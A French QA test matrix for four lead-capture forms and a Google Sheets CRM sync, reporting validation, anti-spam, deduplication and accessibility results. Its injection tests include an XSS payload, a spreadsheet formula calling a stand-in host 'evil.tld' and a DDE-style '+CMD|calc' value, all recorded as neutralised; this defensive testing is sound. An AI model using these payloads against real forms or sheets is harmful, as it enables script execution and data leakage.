# MATRICE EXHAUSTIVE DES TESTS DE RECETTE — MISSION AGIA-009

**Référence :** SYNTESIA-QA-MATRICE-009  
**Date :** 21 novembre 2026  
**Environnement de test :** Chromium Headless (`/usr/bin/chromium`) piloté par WebSocket CDP + Node.js `v24.22.3` + Python `3.11` + Google Sheets API (`gsheets`)  
**Total des contrôles :** **`79` contrôles recensés** (`77` **`TESTÉ ET RÉUSSI`**, `0` **`TESTÉ ET ÉCHOUÉ`**, `1` **`NON TESTÉ EN DIRECT`**, `1` **`IMPOSSIBLE À VÉRIFIER FAUTE D'ACCÈS / GARDE-FOU`**)

---

## 1. VOLET A — MATRICE DES 40 TESTS FONCTIONNELS & SÉCURITÉ DES 4 FORMULAIRES (NAVIGATEUR CHROMIUM CDP)

Chaque cas de test (`TC-01` à `TC-10`) a été exécuté dans le DOM réel de Chromium sur chacun des 4 formulaires :
- **`F1`** : `sites/france/index.html` (`#leadFormSyntesiaFr`)
- **`F2`** : `sites/algerie/index.html` (`#leadFormSyntesiaDz`)
- **`F3`** : `sites/france/securite-privee/index.html` (`#formSecu`)
- **`F4`** : `sites/france/batiment-renovation/index.html` (`#formBtp`)

| Code Test | Scénario testé | Entrée injectée dans Chromium | Résultat attendu | `F1` France | `F2` Algérie | `F3` Sécurité | `F4` Bâtiment/BTP |
| :---: | :--- | :--- | :--- | :---: | :---: | :---: | :---: |
| **`TC-01`** | **Champs obligatoires manquants** | Soumission à vide (`nom=""`, `entreprise=""`, `email=""`, `telephone=""`) | Blocage de l'envoi, affichage du bandeau `#B84A27` `[CONTRÔLE DE SAISIE]`, statut `VALIDATION_ERROR_REQUIRED`. | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** |
| **`TC-02`** | **Adresse e-mail invalide** | `email = "adresse.invalide@"` (autres champs valides + RGPD coché) | Blocage de l'envoi, message `[FORMAT E-MAIL INVALIDE]`, statut `VALIDATION_ERROR_EMAIL`. | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** |
| **`TC-03a`** | **Numéro de téléphone trop court (< 8 chiffres)** | `telephone = "06123"` | Blocage de l'envoi, message `[FORMAT TÉLÉPHONE INVALIDE]`, statut `VALIDATION_ERROR_PHONE`. | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** |
| **`TC-03b`** | **Numéro de téléphone contenant des balises / lettres** | `telephone = "<script>0612345678</script>"` | Rejet par `/^[+\d\s().\-/]{8,25}$/`, statut `VALIDATION_ERROR_PHONE`. | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** |
| **`TC-04`** | **Consentement RGPD absent** | Tous les champs texte valides, mais `rgpd_consent.checked = false` | Blocage spécifique, message `[CONSENTEMENT RGPD REQUIS]`, statut `VALIDATION_ERROR_RGPD`. | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** |
| **`TC-05`** | **Honeypot anti-spam renseigné** | Champ caché (`website_url` / `website_url_dz` / `company_website` / `business_site`) = `"https://spam-bot.example"` | Interruption silencieuse immédiate, aucune donnée traitée, statut `FILTERED_HONEYPOT`. | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** |
| **`TC-06`** | **Comportement après erreur (Reprise sur erreur)** | Soumission en erreur (`TC-02`/`TC-04`), correction du champ erroné puis nouvelle soumission | Disparition complète du bandeau rouge d'erreur `#B84A27` et remplacement par le panneau de confirmation `#EAE9E2`. | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** |
| **`TC-07`** | **Soumission valide, message de confirmation & conformité schéma 15 colonnes** | Prospect B2B fictif complet + RGPD coché (`WEBHOOK_ENABLED = false`) | Statut `PREPROD_VALIDATED`, message de confirmation affiché (`role="status"`), `payload` conforme aux 15 colonnes, score calculé (`10/10` sur F1/F3, `8/10` sur F2/F4), `0` appel réseau émis. | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** |
| **`TC-08`** | **Double soumission identique** | Resoumission immédiate du même prospect (`email + verticale + besoin`) | Blocage anti-doublon pendant 120 s, message `[DEMANDE DÉJÀ ENREGISTRÉE]`, statut `DUPLICATE_SUBMISSION_BLOCKED`. | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** |
| **`TC-09`** | **Injection XSS DOM & Injection de formule Google Sheets (`CWE-1236`)** | `nom = '=IMPORTXML("http://evil.tld","//a") <img src=x onerror=alert(1)>'`, `entreprise = '+CMD\|calc!A0'` | 1. Dans le DOM : chevrons échappés (`&lt;img...`), `0` exécution JS.<br>2. Dans `payload` : préfixage par apostrophe `'=IMPORTXML...` et `'+CMD...`. | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI** |

---

## 2. VOLET B — MATRICE DES TESTS SERVEUR CRM & GOOGLE SHEETS (11 TESTS)

| Code Test | Composant testé | Description du test | Résultat observé | Statut officiel |
| :---: | :--- | :--- | :--- | :---: |
| **`GAS-01`** | `google_apps_script_crm_sync.js` (`doPost`) | Ingestion JSON valide France (Sécurité Privée, 50-150 agents, `test_mode: true`) | `result: "success"`, `15` colonnes insérées, `score: 10`, `statut: "TEST_QUALIFIE"`, `environnement: "TEST"`. | **TESTÉ ET RÉUSSI** |
| **`GAS-02`** | `google_apps_script_crm_sync.js` (`doPost`) | Ingestion JSON valide Algérie (Bâtiment/Promotion DZ, PME 50-150, `test_mode: true`) | `result: "success"`, `15` colonnes insérées, `Marche: "Algerie"`, `score: 10`, `statut: "TEST_QUALIFIE"`. | **TESTÉ ET RÉUSSI** |
| **`GAS-03`** | `google_apps_script_crm_sync.js` (`doPost`) | Filtrage serveur du Honeypot Algérie (`website_url_dz` rempli) | `note: "Filtered by honeypot"`, `0` ligne ajoutée dans la feuille. | **TESTÉ ET RÉUSSI** |
| **`GAS-04`** | `google_apps_script_crm_sync.js` (`doPost`) | Protection serveur contre l'injection de formules Google Sheets (`CWE-1236`) | Les valeurs `=IMPORTXML(...)`, `+CMD...` et `@SUM(...)` sont toutes préfixées par `'` avant `appendRow`. | **TESTÉ ET RÉUSSI** |
| **`GAS-05`** | `google_apps_script_crm_sync.js` (`doPost`) | Rejet serveur d'un e-mail invalide et d'un téléphone contenant `<script>` | Retourne `code: "INVALID_EMAIL"` et `code: "INVALID_PHONE"`, `0` ligne insérée. | **TESTÉ ET RÉUSSI** |
| **`GAS-06`** | `google_apps_script_crm_sync.js` (`doPost`) | Dédoublonnage serveur sur les 25 dernières lignes (`email + verticale + besoin + env`) | Retourne `result: "duplicate"`, `code: "DUPLICATE_LEAD"`, `0` ligne doublon insérée. | **TESTÉ ET RÉUSSI** |
| **`GAS-07`** | `google_apps_script_crm_sync.js` (`doPost`) | Protection DoS contre un payload JSON surdimensionné (`16 000` octets `> 15 Ko`) | Retourne `code: "PAYLOAD_TOO_LARGE"`, rejet avant `JSON.parse`. | **TESTÉ ET RÉUSSI** |
| **`GAS-08`** | `google_apps_script_crm_sync.js` (`doPost`) | Gestion de concurrence lorsque `LockService.tryLock(10000)` échoue | Retourne `code: "LOCK_TIMEOUT"` proprement au format JSON. | **TESTÉ ET RÉUSSI** |
| **`CRM-LIVE-01`** | `scripts/orchestrate_crm.py` + API Google Sheets réelle | Insertion contrôlée en mode `is_test=True` d'un prospect fictif `[TEST_AGIA_009]` avec tentative d'injection `=TEST_FORMULE_NEUTRALISEE_AGIA_009` et relecture via `gsheets readonly read` | Ligne `LEAD-TEST-20261121-183904-4493` écrite et relue avec succès dans `01_PROSPECTS_LEADS!A3:O3` (`15` colonnes exactes, formule neutralisée par `'=`, `Environnement = "TEST"`). | **TESTÉ ET RÉUSSI** |
| **`GAS-HTTP-LIVE`** | Endpoint Web App distant `script.google.com/macros/s/.../exec` | Requête HTTP `POST` externe depuis le navigateur vers l'URL de production Google Apps Script | Non exécuté : Web App non déployée en production + garde-fou impératif `WEBHOOK_ENABLED = false`. | **IMPOSSIBLE À VÉRIFIER FAUTE D'ACCÈS / GARDE-FOU** |
| **`GAS-MAIL-LIVE`** | Quotas & distribution réelle `MailApp.sendEmail` Google Workspace | Réception effective de l'e-mail d'alerte interne dans la boîte Gmail du fondateur | Simulé avec succès dans le banc `doPost` (vérification de l'absence de PII dans l'objet et le corps), non déclenché en production réelle. | **NON TESTÉ EN DIRECT** |

---

## 3. VOLET D & F — MATRICE MULTI-VIEWPORTS, ACCESSIBILITÉ & INTÉGRITÉ TECHNIQUE (28 TESTS)

| Page auditée | `375 px` (Mobile) | `768 px` (Tablette) | `1024 px` (Laptop) | `1440 px` (Desktop) | Tiroir `[MENU]` & Clavier `:focus-visible` | Labels `<label for="id">` | Liens & Scripts (`0` brisé / `0` tiers) |
| :--- | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
| **`sites/france/index.html`** | **TESTÉ ET RÉUSSI**<br>(`375 <= 375`) | **TESTÉ ET RÉUSSI**<br>(`753 <= 768`) | **TESTÉ ET RÉUSSI**<br>(`1009 <= 1024`) | **TESTÉ ET RÉUSSI**<br>(`1425 <= 1440`) | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI**<br>(`10 / 10`) | **TESTÉ ET RÉUSSI**<br>(`31 / 31` · `0` tiers) |
| **`sites/algerie/index.html`** | **TESTÉ ET RÉUSSI**<br>(`375 <= 375`) | **TESTÉ ET RÉUSSI**<br>(`753 <= 768`) | **TESTÉ ET RÉUSSI**<br>(`1009 <= 1024`) | **TESTÉ ET RÉUSSI**<br>(`1425 <= 1440`) | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI**<br>(`8 / 8`) | **TESTÉ ET RÉUSSI**<br>(`21 / 21` · `0` tiers) |
| **`sites/france/securite-privee/index.html`** | **TESTÉ ET RÉUSSI**<br>(`375 <= 375`) | **TESTÉ ET RÉUSSI**<br>(`753 <= 768`) | **TESTÉ ET RÉUSSI**<br>(`1009 <= 1024`) | **TESTÉ ET RÉUSSI**<br>(`1425 <= 1440`) | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI**<br>(`8 / 8`) | **TESTÉ ET RÉUSSI**<br>(`22 / 22` · `0` tiers) |
| **`sites/france/batiment-renovation/index.html`** | **TESTÉ ET RÉUSSI**<br>(`375 <= 375`) | **TESTÉ ET RÉUSSI**<br>(`753 <= 768`) | **TESTÉ ET RÉUSSI**<br>(`1009 <= 1024`) | **TESTÉ ET RÉUSSI**<br>(`1425 <= 1440`) | **TESTÉ ET RÉUSSI** | **TESTÉ ET RÉUSSI**<br>(`8 / 8`) | **TESTÉ ET RÉUSSI**<br>(`20 / 20` · `0` tiers) |
| **`sites/shared/mentions-legales-confidentialite.html`** | **TESTÉ ET RÉUSSI**<br>(`375 <= 375`) | **TESTÉ ET RÉUSSI**<br>(`753 <= 768`) | **TESTÉ ET RÉUSSI**<br>(`1009 <= 1024`) | **TESTÉ ET RÉUSSI**<br>(`1425 <= 1440`) | **TESTÉ ET RÉUSSI** | **N/A** (`0` champ) | **TESTÉ ET RÉUSSI**<br>(`12 / 12` · `0` tiers) |
